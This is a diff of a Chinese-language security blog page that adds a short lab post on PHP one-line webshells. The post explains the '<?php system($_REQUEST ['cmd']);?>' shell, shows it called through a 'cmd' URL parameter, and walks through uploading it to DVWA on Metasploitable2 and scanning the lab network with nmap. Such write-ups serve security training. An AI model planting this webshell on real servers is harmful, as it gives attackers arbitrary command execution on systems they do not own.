@@ -4,15 +4,21 @@
   <meta charset="utf-8">
   
   
-  <title>标签: 代码审计 | edfhh&#39;s Blog</title>
+  <title>测试 | edfhh&#39;s Blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="edfhh&#39;s Blog">
-<meta property="og:url" content="https://edfhh.github.io/blog/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/index.html">
+  <meta name="description" content="什么是一句话木马一句话木马是指向目标网站注入一行代码，攻击者可以利用这行代码，接收并执行远程发送的任意命令，是一种精简、隐蔽的Web脚本。 例如：  Lobster AIbash这行代码通常被通过注入漏洞注入，或者写在文件里，利用文件上传漏洞上传到服务器。 system函数可以用来执行命令并将相应的执行结果输出 $_REQUEST [‘cmd’]获取用户提交的数据，cmd是攻击者要执行的命令，由攻">
+<meta property="og:type" content="article">
+<meta property="og:title" content="测试">
+<meta property="og:url" content="https://edfhh.github.io/blog/2026/07/27/%E6%B5%8B%E8%AF%95/index.html">
 <meta property="og:site_name" content="edfhh&#39;s Blog">
+<meta property="og:description" content="什么是一句话木马一句话木马是指向目标网站注入一行代码，攻击者可以利用这行代码，接收并执行远程发送的任意命令，是一种精简、隐蔽的Web脚本。 例如：  Lobster AIbash这行代码通常被通过注入漏洞注入，或者写在文件里，利用文件上传漏洞上传到服务器。 system函数可以用来执行命令并将相应的执行结果输出 $_REQUEST [‘cmd’]获取用户提交的数据，cmd是攻击者要执行的命令，由攻">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://edfhh.github.io/blog/%5Cblog%5Cimages%5Cpasted-1.png">
+<meta property="article:published_time" content="2026-07-27T12:47:00.000Z">
+<meta property="article:modified_time" content="2026-07-27T13:03:21.811Z">
 <meta property="article:author" content="edfhh">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://edfhh.github.io/blog/%5Cblog%5Cimages%5Cpasted-1.png">
   
     <link rel="alternate" href="/blog/atom.xml" title="edfhh's Blog" type="application/atom+xml">
   
@@ -69,39 +75,70 @@
 </header>
 
       <div class="outer">
-        <section id="main">
-  
-  
-    
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/blog/archives/2026" class="archive-year">2026</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      <a href="/blog/2026/07/27/javasec%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/" class="archive-article-date">
-  <time class="dt-published" datetime="2026-07-27T11:30:34.000Z" itemprop="datePublished">7月 27</time>
+        <section id="main"><article id="post-测试" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/blog/2026/07/27/%E6%B5%8B%E8%AF%95/" class="article-date">
+  <time class="dt-published" datetime="2026-07-27T12:47:00.000Z" itemprop="datePublished">2026-07-27</time>
 </a>
-      
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/blog/2026/07/27/javasec%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/">javasec靶场通关</a>
+    <h1 class="p-name article-title" itemprop="headline name">
+      测试
     </h1>
   
 
-    </header>
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>什么是一句话木马<br>一句话木马是指向目标网站注入一行代码，攻击者可以利用这行代码，接收并执行远程发送的任意命令，是一种精简、隐蔽的Web脚本。</p>
+<p>例如：</p>
+<?php system($_REQUEST ['cmd']);?>
+<p>Lobster AI<br>bash<br>这行代码通常被通过注入漏洞注入，或者写在文件里，利用文件上传漏洞上传到服务器。</p>
+<p>system函数可以用来执行命令并将相应的执行结果输出</p>
+<p>$_REQUEST [‘cmd’]获取用户提交的数据，cmd是攻击者要执行的命令，由攻击者传入。如果这句木马被保存在文件shell.php并上传到服务器，那么攻击者可以用类似以下命令进行攻击</p>
+<p>http:&#x2F;&#x2F;靶机IP地址&#x2F;shell.php?cmd&#x3D;ifconfig </p>
+<p>问号后面接要传入的参数， 比如指定命令为ifconfig，查询服务器ip。</p>
+<p>环境<br>靶机：Metasploitable2-Linux的DVWA</p>
+<p>攻击机：kali，windows</p>
+<p>网络环境：同一网段</p>
+<p><img src="/blog/%5Cblog%5Cimages%5Cpasted-1.png" alt="upload successful"></p>
+<p>构造shell.php<br>新建文件shell.php，写入代码</p>
+<?php system($_REQUEST ['cmd']);?>
+<p>Lobster AI<br>bash<br>上传shell.php<br>利用DVWA的文件上传漏洞把shell.php上传到服务器</p>
+<p>主机发现<br>kali查看自己ip</p>
+<p>nmap扫描同一网络下的主机</p>
+<p>很明显这个开着很多服务且没有做端口过滤的就是靶机，确定靶机ip 192.168.138.129</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://edfhh.github.io/blog/2026/07/27/%E6%B5%8B%E8%AF%95/" data-id="cuidr_EYUZewKprpJvHeUG1uM" data-title="测试" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      
+      
+      
+    </footer>
   </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/blog/2026/07/27/javasec%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">后一篇</strong>
+      <div class="article-nav-title">javasec靶场通关</div>
+    </a>
+  
+</nav>
+
+  
 </article>
-  
-  
-    </div></section>
-  
 
 
 </section>
